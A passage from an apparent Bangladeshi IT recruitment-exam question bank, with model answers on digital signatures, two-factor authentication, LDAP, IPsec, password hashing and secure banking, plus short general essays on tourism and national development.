   - A secure system needs both: 2FA stops an impostor logging in, and a digital signature ensures that even an authorised user's instructions cannot be tampered with in transit or later denied.

3. **ডিজিটাল সিগনেচার (Digital Signature) কী? এর কার্যকারিতা ব্যাখ্যা করুন।** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*

Answer: A digital signature is a cryptographic value attached to an electronic document that proves who created it and that it has not been altered since. It is created by hashing the document and encrypting that hash with the signer's private key.

   How it works
   ```mermaid
   flowchart TD
       M[Document] --> H[Hash function SHA-256]
       H --> D[Message digest]
       D --> E[Encrypt with SENDER'S PRIVATE key]
       E --> S[Digital Signature]
       S --> T[Send document + signature]
       T --> V1[Receiver hashes document → Digest A]
       T --> V2[Receiver decrypts signature with<br/>SENDER'S PUBLIC key → Digest B]
       V1 --> C{A = B ?}
       V2 --> C
       C -->|Yes| OK[Valid]
       C -->|No| NO[Invalid — tampered or forged]
   ```

   Effectiveness — the three guarantees it provides
   - **Authentication** — proves the identity of the signer, since only their private key could produce that signature.
   - **Integrity** — any change to the document produces a completely different hash (the avalanche effect), so tampering is detected immediately.
   - **Non-repudiation** — the signer cannot deny having signed. This is legally the most valuable property, and it is what a scanned handwritten signature cannot provide.

   Additional benefits
   - **Speed** — signing and transmission take seconds instead of days by courier.
   - **Cost saving** — no paper, printing, postage or physical archive.
   - **Legal validity** — recognised under the **ICT Act 2006** in Bangladesh, administered by the Controller of Certifying Authorities.
   - **Verifiability by anyone** holding the public key, with no need to contact the signer.

   Where it is used
   - SSL/TLS certificates securing every HTTPS site, signed software updates, e-GP and e-tendering, income tax and VAT returns, banking instructions, and blockchain transactions.

   - Important distinction: a digital signature is a cryptographic construct that can be mathematically verified. An "electronic signature" such as a scanned image of a handwritten signature is neither unique nor verifiable, and can simply be copied onto another document.

4. **(a) What is 2-factor authentication? Describe it with an example.** *[BPSC (Ministry of Power, Energy & Mineral Resources) Assistant Director (ICT) (CS/CSE) 29.05.2025 compact it 1356 (ET: N/A)], [BPSC Workshop Maintenance Engineer (CSE) 2021 compact it 796 (ET: N/A)]*

Answer: Two-Factor Authentication (2FA) is a security process requiring exactly two DIFFERENT categories of credential before access is granted. It is the most common form of multi-factor authentication.

   The three factor categories, of which 2FA uses two
   - **Something you know** — password, PIN.
   - **Something you have** — mobile phone, hardware token, smart card.
   - **Something you are** — fingerprint, face, iris.

   Critical rule
   - The two factors must come from DIFFERENT categories. A password plus a security question is NOT 2FA — both are knowledge factors, and both can be phished in a single conversation.

   Example — online banking transfer
   - **Step 1** — the customer enters their username and password on the bank's website. *(Factor 1: something you know)*
   - **Step 2** — the bank sends a 6-digit OTP to the customer's registered mobile number.
   - **Step 3** — the customer enters that OTP. *(Factor 2: something you have — the phone)*
   - **Step 4** — only after both succeed is the transfer executed.

   Why this is effective
   - An attacker who has phished the password still cannot log in, because they do not have the customer's physical phone.
   - Conversely, someone who steals the phone still needs the password.

   Other common implementations
   - Gmail: password + Google Authenticator TOTP code.
   - ATM: card (have) + PIN (know) — the oldest widely deployed 2FA.
   - Corporate VPN: password + hardware token.
   - Mobile banking app: PIN + fingerprint.

   Weaknesses to note
   - **SMS-based OTP is the weakest form** — vulnerable to SIM swap fraud and SS7 interception. An authenticator app or hardware security key is considerably stronger.

5. **Write down the full form of LDAP?** *[BARI Assistant Maintenance Engineer 15.11.2025 compact it 1451 (ET: N/A)]*

Answer: **LDAP — Lightweight Directory Access Protocol.**

   - An application-layer protocol for accessing and maintaining distributed directory information services over a network.
   - Default port **389**; **636** for LDAPS (LDAP over SSL/TLS).
   - It stores information in a hierarchical tree structure called a Directory Information Tree (DIT), organised as `dc` (domain component), `ou` (organisational unit) and `cn` (common name).
   - Example distinguished name: `cn=Rahim,ou=IT,dc=bank,dc=com`

   Uses
   - **Centralised authentication** — one username and password works across email, file servers, VPN and applications (single sign-on).
   - **User and group management** — a single directory of employees, roles and permissions.
   - **Address book services** for email clients.

   Implementations
   - **Microsoft Active Directory** (the most widely deployed), OpenLDAP, Apache Directory Server, Novell eDirectory.

6. **Your bank has an online banking system and this process is performed by sending OTP in mobile or OTP in mail when a customer transfers money from a mobile banking app or online. This is a secured policy. Without this biometric policy, how can you more secure your online banking? Explain your strategy.** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 306 (ET: BIBM)]*

Answer: SMS and email OTP alone is no longer adequate — SMS OTP is vulnerable to SIM swap and SS7 interception, and email OTP falls with the email account. Without adding biometrics, security can be strengthened substantially in the following ways.

   (a) Replace or supplement SMS OTP with stronger possession factors
   - **Authenticator app TOTP** (Google Authenticator, Microsoft Authenticator) — generated on the device, never transmitted, so it cannot be intercepted.
   - **Push-based approval** in the bank's own app, showing the transaction details, so the customer approves a specific transfer rather than typing a code that could be relayed by a phisher.
   - **Hardware security key (FIDO2/WebAuthn)** — phishing-resistant by design, because the key verifies the site's domain before responding.
   - **Transaction signing** — the OTP is derived from the transaction amount and beneficiary, so an intercepted code cannot authorise a different transfer.

   (b) Device and session controls
   - **Device binding / registration** — new devices require additional verification.
   - **Device fingerprinting** to detect a login from an unrecognised device.
   - **Short session timeouts** and automatic logout.
   - **Certificate pinning** in the mobile app to defeat man-in-the-middle attacks.
   - **Root/jailbreak detection** and refusal to run on a compromised device.

   (c) Risk-based (adaptive) authentication
   - Score each transaction on amount, beneficiary history, location, device, time of day and velocity.
   - Low risk → proceed; medium risk → step-up authentication; high risk → block and call the customer.
   - This is the single highest-value addition, because it applies friction only where it is warranted.

   (d) Transaction-level controls
   - **Beneficiary cooling-off period** — a newly added beneficiary cannot receive a large transfer for a defined number of hours. This alone defeats most account-takeover fraud.
   - **Per-transaction and daily limits**, adjustable by the customer with verification.
   - **Dual authorisation** for corporate accounts above a threshold.
   - **Immediate notification** by SMS, email and push for every debit, so the customer can report fraud within minutes.

   (e) Backend controls
   - **Fraud detection engine** with machine learning on transaction patterns.
   - **Velocity checks** — several transfers in quick succession trigger review.
   - **WAF, rate limiting and bot detection** on the login endpoint.
   - **Full audit logging** into a SIEM with 24/7 monitoring.

   (f) Customer-side measures
   - **Awareness campaigns** — the bank will never ask for an OTP; most fraud in Bangladesh succeeds through vishing, not technical compromise.
   - **Self-service controls** — the customer can disable online transfer, set limits, or lock the card from the app.

   - Priority if only three things could be added: risk-based authentication, beneficiary cooling-off, and push-based transaction approval replacing SMS OTP.

7. **Difference between Digital signature and Digital certificate.** *[Sonali & Janata Bank Officer (IT) 14.10.2023 compact it 527 (ET: MIST)]*

Answer:

   | Point | Digital Signature | Digital Certificate |
   |---|---|---|
   | What it is | A cryptographic value attached to a document | An electronic document binding a public key to an identity |
   | Purpose | Prove who signed a document and that it is unaltered | Prove that a public key genuinely belongs to a named entity |
   | Created by | The sender, using their own private key | A Certificate Authority (CA) |
   | Contains | An encrypted hash of the document | Owner name, public key, CA name, validity period, serial number, CA's signature |
   | Standard | RSA, DSA, ECDSA | X.509 |
   | Provides | Authentication, integrity, non-repudiation | Trust and identity binding |
   | Validity | Tied to one specific document | Valid for a period, typically 1-3 years |
   | Analogy | A signature on a letter | A passport proving who you are |

   How they work together
   - A digital signature is only meaningful if the verifier trusts the public key used to check it.
   - The digital certificate is what supplies that trust: it is issued by a trusted CA and itself carries the CA's signature, confirming that this public key really belongs to the named person or server.
   - In HTTPS: the server presents its **certificate** (proving identity), and uses its private key to create **signatures** during the TLS handshake (proving it actually holds the matching private key).

   - In short: the certificate establishes WHO owns a key; the signature proves that the key's owner produced this particular document.

8. **How to work two factor authentication?** *[Mongla Port Authority Assistant Programmer 2023 compact it 574 (ET: N/A)]*

Answer: 2FA works by requiring the user to prove identity twice, using two credentials from different categories.

   Step-by-step working
   ```mermaid
   flowchart TD
       A[User enters username + password] --> B{Password correct?}
       B -->|No| X[Access denied]
       B -->|Yes| C[Server generates a second challenge]
       C --> D[OTP sent to registered mobile<br/>or TOTP generated in the app]
       D --> E[User enters the code]
       E --> F{Code correct and within time window?}
       F -->|No| X
       F -->|Yes| G[Access granted]
   ```

   - **Step 1** — the user submits the first factor, usually username and password (something they know).
   - **Step 2** — the server verifies it. Failure ends the process here.
   - **Step 3** — the server issues a second challenge tied to something the user HAS.
   - **Step 4** — the code arrives by SMS or push, or is generated locally by an authenticator app.
   - **Step 5** — the user enters it within a short validity window, usually 30 to 60 seconds.
   - **Step 6** — the server verifies it and grants access.

   How TOTP works internally
   - The server and the app share a secret key, established once at setup by scanning a QR code.
   - Both compute `HMAC(secret, current 30-second time window)` and take six digits from the result.
   - Because both sides derive the same code independently from the shared secret and the clock, no code is ever transmitted — which is exactly why TOTP resists interception, unlike SMS.

   Why it is secure
   - An attacker with only the password cannot pass step 3; an attacker with only the phone cannot pass step 1.

   Weakest form to avoid where possible
   - **SMS OTP** — vulnerable to SIM swap fraud and SS7 network interception. Authenticator apps and FIDO2 hardware keys are considerably stronger.

9. **(b) How do you define 2 factor authentication? Give example.** *[BPSC (Multiple Ministry) Assistant Programmer (CSE) 19.07.2023 compact it 486 (ET: N/A)]*

Answer: Two-Factor Authentication is a security mechanism that grants access only after the user successfully presents two pieces of evidence from two DIFFERENT categories of authentication factor.

   The three categories
   - **Knowledge** — something you know: password, PIN.
   - **Possession** — something you have: phone, token, smart card.
   - **Inherence** — something you are: fingerprint, face, iris.

   The defining rule
   - The two factors must be from different categories. Password + security question is not 2FA, because both are knowledge and both fall to a single phishing call.

   Examples

   | System | Factor 1 (know) | Factor 2 |
   |---|---|---|
   | ATM withdrawal | PIN | The physical card (have) |
   | Online banking | Password | OTP to registered mobile (have) |
   | Gmail | Password | Authenticator app code (have) |
   | Mobile banking app | App PIN | Fingerprint (are) |
   | Corporate VPN | Domain password | Hardware token (have) |

   Worked example — bKash transfer
   - The customer opens the app and enters their PIN — factor 1, knowledge.
   - The transaction is authorised only from the registered SIM on the registered device — factor 2, possession.
   - Someone who learns the PIN cannot use it from their own phone; someone who steals the phone does not know the PIN.

   Benefit
   - Even if the password database of a service is breached entirely, accounts protected by 2FA remain secure, because the stolen passwords alone are not enough to log in.

10. **What is digital signature? Where is it used?** *[BPSC (Ministry of Home Affairs) Assistant Engineer 17.05.2022 compact it 635 (ET: N/A)]*

Answer:

    (a) Digital signature
    - A cryptographic value attached to an electronic document, created by hashing the document and encrypting that hash with the signer's private key. It proves who signed the document and that it has not been altered.
    - It provides three guarantees: **authentication**, **integrity** and **non-repudiation**.

    Working
    - Sign: `Signature = Encrypt(Hash(document), private key)`
    - Verify: decrypt the signature with the signer's public key, hash the received document independently, and compare the two.

    (b) Where it is used

    **Internet security**
    - **SSL/TLS certificates** — every HTTPS website relies on digitally signed certificates.
    - **Code signing** — Windows, Android and macOS verify the signature of software before installing, so malware cannot masquerade as a legitimate update.
    - **Signed email** (S/MIME, PGP).

    **Government and legal**
    - **e-GP electronic tendering** in Bangladesh — bids are digitally signed.
    - Income tax and VAT return filing.
    - Digitally signed government circulars and notifications.
    - Legally valid under the **ICT Act 2006**, with certificates issued by licensed Certifying Authorities under the CCA.

    **Banking and finance**
    - Payment instructions and fund transfer authorisation.
    - Inter-bank messaging (SWIFT).
    - Digitally signed statements and contracts.

    **Other**
    - **Blockchain** — every cryptocurrency transaction is a digital signature.
    - E-passports and national ID chips.
    - Document management systems and digital contracts.

11. **What is a digital signature? Describe its role in digital security?** *[BPSC (Ministry of Agriculture) Assistant Programmer 15.02.2022 compact it 679 (ET: N/A)]*

Answer:

    (a) Digital signature
    - A mathematical scheme for verifying the authenticity and integrity of a digital message or document. The signer hashes the content and encrypts the hash with their private key; anyone can verify it with the corresponding public key.

    (b) Role in digital security

    **1. Authentication**
    - Proves the identity of the sender. Since only the signer holds the private key, a valid signature could only have been produced by them. This prevents impersonation.

    **2. Integrity**
    - Any modification to the document, however small, produces an entirely different hash. The verification then fails, so tampering is detected with certainty rather than suspicion.

    **3. Non-repudiation**
    - The signer cannot later deny having signed, because nobody else possesses that private key. This is what makes digital contracts and payment instructions legally enforceable, and it is a property that no physical measure provides as strongly.

    **4. Trust in an untrusted medium**
    - The internet is an open network where anyone can claim to be anyone. Digital signatures, combined with certificates from a trusted CA, are what allow a browser to be confident it is really talking to the bank.

    **5. Software supply chain protection**
    - Code signing means an operating system will refuse to install an update whose signature does not verify, blocking a major malware distribution route.

    **6. Enabling paperless processes**
    - E-tendering, tax filing, digital contracts and e-governance all depend on it. Without non-repudiation, none of these could replace paper.

    - Limitation worth stating: a digital signature proves who holds the private key, not who was physically at the keyboard. Protecting the private key — in an HSM, smart card or secure enclave — is therefore essential to the whole scheme.

12. **What is Digital signature? Explain shortly.** *[Microcredit Regulatory Authority (MRA) Assistant Maintenance Engineer 2022 compact it 718 (ET: N/A)]*

Answer: A digital signature is an electronic, cryptographic value attached to a document that proves who created it and that it has not been changed since signing.

    How it works
    - The sender computes a hash of the document, then encrypts that hash with their **private key**. The result is the signature.
    - The receiver decrypts the signature with the sender's **public key** to recover the hash, hashes the received document independently, and compares the two values.
    - A match confirms both the sender's identity and the document's integrity.

    What it guarantees
    - **Authentication** — confirms who signed.
    - **Integrity** — confirms nothing was altered.
    - **Non-repudiation** — the signer cannot deny signing.

    Algorithms
    - RSA, DSA, ECDSA, combined with a hash function such as SHA-256.

    Uses
    - SSL/TLS certificates, signed software updates, e-tendering, tax returns, banking instructions, and blockchain transactions.

    - It is legally recognised in Bangladesh under the ICT Act 2006, and it is fundamentally different from a scanned image of a handwritten signature, which can simply be copied onto any document.

13. **(খ) Authentication বলতে কি বুঝায়? Two Factor Authenticating কি? উদাহরণসহ ব্যাখ্যা করুন।** *[BPSC Assistant Programmer (ICT Ministry) 2021 compact it 769 (ET: N/A)]*

Answer:

    (a) Authentication
    - The process of verifying that a user, device or system genuinely is who or what it claims to be, before granting access.
    - It answers the question **"Who are you?"**.

    Related but distinct terms
    - **Identification** — claiming an identity, such as entering a username.
    - **Authentication** — proving that claim, such as entering the password.
    - **Authorisation** — deciding what the authenticated user is permitted to do.
    - **Accounting / auditing** — recording what they actually did.

    Authentication methods
    - Password and PIN, OTP, biometrics, smart cards, digital certificates, security tokens.

    (b) Two-Factor Authentication
    - Requiring two credentials from two DIFFERENT categories: something you know, something you have, something you are.
    - The categories must differ — a password plus a security question is not 2FA, since both are knowledge factors.

    Example — internet banking
    - **Factor 1**: the customer enters their password (something they know).
    - **Factor 2**: the bank sends a 6-digit OTP to the registered mobile, and the customer enters it (something they have).
    - Access is granted only when both succeed.

    Second example — ATM
    - The card is something you have; the PIN is something you know. This is the oldest and most familiar 2FA in daily life.

    Why it matters
    - Passwords are routinely stolen through phishing, reuse and data breaches. 2FA ensures that a stolen password alone is worthless to the attacker.

14. **(b) Write down the purpose of Certification Authority (CA) in Digital Signature.** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 797 (ET: N/A)]*

Answer: A **Certification Authority (CA)** is a trusted third party that issues, manages and revokes digital certificates, binding a public key to a verified identity.

    Purposes of the CA

    **1. Identity verification**
    - Before issuing a certificate, the CA verifies that the applicant genuinely is the person or organisation they claim to be. This is the foundation of the whole trust model.

    **2. Binding a public key to an identity**
    - The core problem in public key cryptography is knowing that a public key really belongs to the claimed owner. Without a CA, an attacker could publish their own key labelled "Bangladesh Bank". The certificate, signed by the CA, is the proof of that binding.

    **3. Issuing digital certificates**
    - The CA issues an X.509 certificate containing the owner's name, public key, validity period, serial number and the CA's own digital signature.

    **4. Signing certificates with its own private key**
    - The CA's signature is what makes the certificate trustworthy. Verifiers already trust the CA's root certificate, which is pre-installed in browsers and operating systems.

    **5. Maintaining a Certificate Revocation List (CRL) / OCSP**
    - If a private key is compromised or an employee leaves, the certificate must be invalidated before its expiry date. The CA publishes revocation information so verifiers can check current status.

    **6. Establishing the chain of trust**
    - Root CA → Intermediate CA → End-entity certificate. A verifier follows this chain up to a root it already trusts.

    **7. Key lifecycle management**
    - Renewal, re-issuance and archival of certificates.

    In Bangladesh
    - Licensed Certifying Authorities operate under the **Controller of Certifying Authorities (CCA)**, established under the ICT Act 2006. Their certificates give digital signatures legal standing.

    - Without a CA, digital signatures would still prove that the SAME key signed two documents, but not WHOSE key it is — which is precisely what makes a man-in-the-middle attack on unauthenticated key exchange possible.

15. **১৮. পাসওয়ার্ড সুরক্ষা জন্য যে পদ্ধতি ব্যবহার করা হয় তার নাম কী?** *[BPSC Ministry of Women and Children Affairs Assistant Programmer (CSE) 2021 compact it 942 (ET: N/A)]*

Answer: The method used to protect passwords is **hashing with a salt** — commonly called **salted hashing**.

    How it works
    - The password is never stored. Instead, a random value called a **salt** is generated for each user and appended to the password, and the combination is passed through a one-way hash function.
    - Only the salt and the resulting hash are stored.
    - At login, the entered password is combined with the stored salt, hashed the same way, and the two hashes are compared.

    ```
    Stored = salt + Hash(password + salt)
    ```

    Why hashing rather than encryption
    - Hashing is one-way. Even if the entire database is stolen, the original passwords cannot be recovered. Encryption is reversible, so a stolen key would expose every password.

    Why the salt is essential
    - Without a salt, two users with the same password produce the same hash, and pre-computed **rainbow tables** can reverse common passwords instantly.
    - A unique random salt per user makes every hash different and renders rainbow tables useless.

    Recommended algorithms
    - **bcrypt**, **Argon2** and **PBKDF2** — deliberately SLOW, which limits an attacker to a few thousand guesses per second instead of billions.
    - MD5 and SHA-1 must not be used for passwords: they are fast by design, which is exactly the wrong property here.

    Supporting measures
    - Strong password policy, account lockout after failed attempts, multi-factor authentication, and never transmitting passwords except over TLS.

16. **What do you mean by two factor authentication? Explain with example.** *[BTRC Assistant Director (Technical) 2019 compact it 1147-1148 (ET: N/A)]*

Answer: Two-Factor Authentication means verifying a user's identity using two independent credentials drawn from two DIFFERENT categories of authentication factor, so that compromising one does not grant access.

    The three categories
    - **Something you know** — password, PIN, passphrase.
    - **Something you have** — mobile phone, hardware token, smart card, security key.
    - **Something you are** — fingerprint, face, iris, voice.

    Example 1 — mobile banking transfer
    - The customer opens the app and enters the PIN. *(know)*
    - The bank sends an OTP to the registered mobile number; the customer enters it. *(have)*
    - Only then is the transfer executed.
    - An attacker who phished the PIN cannot complete the transfer without the physical phone.

    Example 2 — ATM withdrawal
    - Insert the card *(have)*, enter the PIN *(know)*. A stolen card without the PIN, or a known PIN without the card, is useless.

    Example 3 — corporate email
    - Password *(know)* plus a code from Microsoft Authenticator *(have)*.

    Why organisations mandate it
    - Passwords fail constantly through phishing, reuse across sites, and large-scale breaches. 2FA means a leaked password database does not translate into account takeover.
    - Both PCI DSS and the Bangladesh Bank ICT Security Guideline require MFA for administrative and remote access.

    Practical caution
    - **SMS OTP is the weakest second factor**, being vulnerable to SIM swap and SS7 interception. An authenticator app, push approval, or a FIDO2 hardware key provides substantially stronger protection.

## Cryptography & Network Security (14)

1. **What is difference between SHA and RSA algorithm?** *[EGCB Sub-Assistant Engineer (ICT) 08.10.2021 compact it 838 (ET: BUET)]*

Answer:

    | Feature | SHA (Secure Hash Algorithm) | RSA (Rivest-Shamir-Adleman) |
    |---|---|---|
    | Nature of Algorithm | Cryptographic Hash Function (One-way) | Asymmetric Cryptographic Algorithm (Two-way) |
    | Key Requirement | Keyless (Generates fixed digest from input) | Uses a Public-Private Key Pair (Public key encrypts, Private key decrypts) |
    | Reversibility | Irreversible; original text cannot be retrieved from hash | Reversible; ciphertext can be decrypted back to plaintext |
    | Output Size | Fixed length regardless of input (e.g., 256 bits for SHA-256) | Variable, depends on key length (e.g., 2048 or 4096 bits) |
    | Primary Purpose | Integrity verification and password hashing | Data encryption, digital signatures, and key exchange |

2. **Focus Witting: Banking Security (English) [Discuss the key security measures used in modern banking applications to protect customer data and prevent fraud.]** *[Senior Officer (IT) Date: 17 October 2015 Full Marks: 200 Time: 2 hours [bitbox it book 229]]*

Answer: Modern banking applications operate under continuous cybersecurity threats, requiring robust defense mechanisms across data transmission, storage, and transaction processing. Core security measures include:

    - End-to-End Encryption: Sensitive financial records and PINs are secured using AES-256 at rest and TLS 1.3 in transit to prevent sniffing and man-in-the-middle attacks.
    - Multi-Factor Authentication (MFA): Financial portals mandate time-based OTPs, biometrics, or hardware tokens alongside passwords.
    - Real-Time AI Fraud Detection: Machine learning algorithms analyze transaction anomalies, geolocation shifts, and velocity patterns to block fraudulent attempts immediately.
    - Role-Based Access Control (RBAC): Strict least-privilege policies enforce separation of duties for bank employees and database administrators.
    - Secure APIs and WAFs: Web Application Firewalls and signed API gateways protect core banking software from SQL injection, Cross-Site Scripting, and credential stuffing.
    - Regular VAPT and Red Teaming: Routine vulnerability assessments and compliance audits ensure compliance with central bank cybersecurity mandates.

3. **What is IPSec? Describe components of IPSec. (05)** *[বাংলাদেশ পল্লী বিদ্যুতায়ন বোর্ড (BREB) তারিখ: ২১/১২/২০২৫ পূর্ণমান: ১০০ সময়: ২.০০ ঘণ্টা পদের নাম: সহকারী প্রোগ্রামার [bitbox it book 313]]*

Answer: IPsec (Internet Protocol Security) is a framework of open standards developed by the IETF that secures communications across IP networks by providing network-layer authentication, data integrity, anti-replay, and encryption.

    Key Components of IPsec:
    - Authentication Header (AH): Provides data origin authentication and connectionless integrity for IP packets. AH computes a cryptographic hash over the packet headers and payload to verify sender identity, but it does not provide encryption.
    - Encapsulating Security Payload (ESP): Provides data confidentiality via symmetric encryption (e.g., AES), integrity, origin authentication, and anti-replay protection by encapsulating the packet payload.
    - Internet Key Exchange (IKE / ISAKMP): An automated key management protocol that negotiates security associations (SAs), exchanges public keys, and derives shared session keys. Operates in Phase 1 (establishing a secure channel) and Phase 2 (negotiating IPsec tunnel parameters).
    - Security Association (SA): A unidirectional agreement between communicating peers defining the active encryption algorithms, keys, and security parameters identified by a Security Parameter Index (SPI).

4. **What is Operating System? Describe functions of Operating System and its services. (05)** *[বাংলাদেশ পল্লী বিদ্যুতায়ন বোর্ড (BREB) তারিখ: ২১/১২/২০২৫ পূর্ণমান: ১০০ সময়: ২.০০ ঘণ্টা পদের নাম: সহকারী প্রোগ্রামার [bitbox it book 315]]*

Answer: An Operating System (OS) is system software that acts as an intermediary between computer hardware and user applications. It manages hardware resources, provides an execution environment, and abstract machine complexities.

    Core Functions of an OS:
    - Processor Management: Allocates CPU time to competing processes using scheduling algorithms (e.g., Round Robin, FCFS, Priority).
    - Memory Management: Tracks allocated and free memory blocks, performing dynamic allocation and virtual memory paging.
    - File System Management: Organizes files into directories, controlling file access, reading, writing, and permissions.
    - Device Management: Coordinates input/output devices through device drivers and interrupt handling.
    - Security and Protection: Enforces user authentication, process isolation, and resource access authorization.

    Key OS Services:
    - Program execution, I/O operations management, file system manipulation, inter-process communications (IPC), error detection and handling, and system resource accounting.

5. **Write a paragraph on "Tourism Development in Bangladesh". (07)** *[বাংলাদেশ পল্লী বিদ্যুতায়ন বোর্ড (BREB) তারিখ: ২১/১২/২০২৫ পূর্ণমান: ১০০ সময়: ২.০০ ঘণ্টা পদের নাম: সহকারী প্রোগ্রামার [bitbox it book 316]]*

Answer: Bangladesh holds immense potential for tourism with its rich cultural heritage, historical landmarks, and diverse natural landscapes. The country is home to Cox's Bazar, the world's longest unbroken sea beach, the Sundarbans, the largest mangrove forest and royal Bengal tiger habitat, the scenic hill tracts of Bandarban and Sajek Valley, and archaeological treasures like Paharpur Buddhist Vihara. Strategic tourism development requires upgrading road, rail, and air connectivity, establishing modern eco-friendly resorts, and expanding online booking and digital payment facilities. Ensuring tourist safety, simplifying visa processes, and actively promoting community-based eco-tourism through international digital campaigns can significantly accelerate foreign exchange earnings and employment generation in Bangladesh.

6. **What is a spoofed packet, and how can it be used in network attacks?** *[Bangladesh Planning Commission Assistant Programmer; Date: 03 February 2024 Exam taker: BPSC; Sort Question and Broad Question:20+60 [bitbox it book 325]]*

Answer: A spoofed packet is an IP packet where the sender deliberately modifies the source IP address in the packet header to disguise their true identity or impersonate another legitimate network device.

    Mechanisms in Network Attacks:
    - Denial-of-Service (DoS) and DDoS Amplification: Attackers send small requests with the victim's spoofed IP to reflection servers (like open DNS or NTP resolvers), causing massive responses to flood and overwhelm the victim's bandwidth.
    - TCP SYN Flood Attacks: Sending SYN packets with unreachable spoofed source IPs forces the target server to allocate resources and hold half-open connections until memory is exhausted.
    - Blind Spoofing and Unauthorized Access: Attackers bypass firewall rules that trust specific internal IP addresses by forging legitimate internal addresses.
    - Man-in-the-Middle (MitM) Attacks: Combined with ARP spoofing, forged packets intercept and alter communication between trusted endpoints.

7. **List and briefly describe five principal functions of an operating system.** *[Bangladesh Planning Commission Assistant Programmer; Date: 03 February 2024 Exam taker: BPSC; Sort Question and Broad Question:20+60 [bitbox it book 325]]*

Answer: The five principal functions of an Operating System are:

    - Process Management: Creates, schedules, synchronizes, and terminates processes while preventing deadlocks using CPU scheduling.
    - Memory Management: Allocates and deallocates primary memory spaces to running processes and handles virtual memory via paging and segmentation.
    - File Management: Manages structured secondary storage, handling file creation, deletion, directory navigation, and file access control.
    - I/O and Device Management: Manages hardware peripherals using dedicated device drivers, buffering, caching, and spooling.
    - Security and Access Protection: Protects system data against unauthorized access through authentication, privilege levels (Kernel vs User mode), and access control lists.

8. **(a) What is authentication? With example write a short note on “Two factor authentication”. [5 marks]** *[Bangladesh Public Service Commission Assistant Maintenance Engineer; Date: 09 February, 2024 Exam Taker: BPSC; Written [bitbox it book 335]]*

Answer: Authentication is the security verification process of confirming the true identity of a user, device, or system entity before granting access to resources.

    Two-Factor Authentication (2FA):
    - 2FA is an identity verification mechanism requiring users to present two distinct authentication factors before gaining access.
    - The three standard authentication factors are:
      1. Knowledge factor (Something you know): Password, PIN.
      2. Possession factor (Something you have): Smartphone OTP, hardware token, smart card.
      3. Inherence factor (Something you are): Fingerprint, facial biometrics, retina scan.
    - Practical Example: When logging into an internet banking portal, the user first inputs their username and password (Knowledge factor). The system then generates and transmits a 6-digit Time-based One-Time Password (TOTP) to the user's registered mobile device (Possession factor). Access is granted only when both factors are verified, rendering stolen passwords useless on their own.

9. **Role of computer on education system in Bangladesh.** *[Bankers' Selection Committee Secretariat Post: Assistant Programmer; Date: 15 Feb, 2024 Exam Taker: ANZA; Post: 35 [bitbox it book 357]]*

Answer: Computers and information technology have transformed the education ecosystem in Bangladesh, democratizing learning and modernizing administrative workflows:

    - Multimedia Classrooms: Digital content and smart boards simplify abstract concepts in science, technology, and mathematics for primary and secondary students.
    - Distance Learning and MOOC Platforms: Platforms like Muktopaath, Shikkhok Batayon, and online university portals deliver courses to remote rural areas.
    - Digital Examination and Administration: Automated student registration, result processing, e-admit cards, and digital transcripts streamline institutional management.
    - Interactive E-Books: The National Curriculum and Textbook Board (NCTB) provides digital access to all school textbooks, ensuring uninterrupted availability.
    - Research and Skill Development: Computer labs foster coding, software development, and freelance technical skills among tertiary students.

10. **English: “50 years of bangladesh achievement and progress”** *[National Skills Development Authority – NSDA Post: Programmer; Date: 10 March, 2024 Exam Taker: NSDA; Total:90 GK:60, T:30 [bitbox it book 376]]*

Answer: Since gaining independence in 1971, Bangladesh has achieved remarkable socio-economic transformations across five decades. Emerging from war devastation and poverty, the nation has evolved into a rapidly growing developing economy. Key milestones include achieving food self-sufficiency, reducing maternal and infant mortality rates, and attaining near-universal primary school enrollment with gender parity. The ready-made garments (RMG) sector and remittance inflows from migrant workers serve as economic pillars. In infrastructure, mega-projects such as the Padma Multipurpose Bridge, Dhaka Metro Rail, Bangabandhu Tunnel, and Rooppur Nuclear Power Plant demonstrate growing self-reliance. In information technology, widespread mobile financial services (bKash, Nagad), submarine cable expansions, and nationwide digitisation have laid the foundation for an inclusive digital economy.

11. **As a programmer when you release a software What security should you check before release your software.** *[National Skills Development Authority – NSDA Post: Programmer; Date: 10 March, 2024 Exam Taker: NSDA; Total:90 GK:60, T:30 [bitbox it book 376-377]]*

Answer: Before deploying software to production, a programmer must execute the following security verifications:

    - Input Validation & Output Sanitization: Ensure all incoming user inputs are strictly validated, parameterized against SQL injection, and sanitized against Cross-Site Scripting (XSS).
    - Authentication and Session Security: Verify strong password policies, secure session timeouts, HTTPS-only cookie attributes (Secure, HttpOnly, SameSite), and multi-factor authentication.
    - Authorization and Access Control: Test role-based access control (RBAC) to ensure unauthorized users cannot access privileged API endpoints or tamper with object references (IDOR).
    - Secret and Key Management: Verify that API keys, database credentials, and cryptographic keys are removed from source code and loaded from secure environment variables.
    - Dependency and Vulnerability Scanning: Run Software Composition Analysis (SCA) to identify known CVEs in third-party libraries and execute Static/Dynamic Application Security Testing (SAST/DAST).
    - Cryptographic Implementation: Confirm that sensitive data at rest is encrypted with standard algorithms (AES-256) and passwords are hashed using salted functions like bcrypt or Argon2.
    - Error Handling and Logging: Ensure detailed system error traces and stack traces are suppressed in user responses while audit logs are securely recorded.

12. **“Smart Bangladesh” সংক্ষেপে আলোচনা করুন।** *[National Skills Development Authority – NSDA Post: Programmer; Date: 10 March, 2024 Exam Taker: NSDA; Total:90 GK:60, T:30 [bitbox it book 377]]*

Answer: "স্মার্ট বাংলাদেশ" হলো ২০৪১ সালের মধ্যে বাংলাদেশকে একটি সাশ্রয়ী, টেকসই, জ্ঞানভিত্তিক ও উদ্ভাবনী উন্নত রাষ্ট্রে রূপান্তরের জাতীয় ভিশন। এটি মূলত চারটি মূল স্তম্ভের ওপর প্রতিষ্ঠিত:

    - ১. স্মার্ট সিটিজেন (Smart Citizen): প্রতিটি নাগরিক প্রযুক্তি ব্যবহারে দক্ষ হবেন, ডিজিটাল সাক্ষরতা অর্জন করবেন এবং উদ্ভাবনী মানসিকতা ধারণ করবেন।
    - ২. স্মার্ট গভর্নমেন্ট (Smart Government): সরকারি সব সেবা শতভাগ পেপারলেস, স্বয়ংক্রিয়, স্বচ্ছ ও ইন্টারঅপারেবল প্ল্যাটফর্মে রূপান্তর করা।
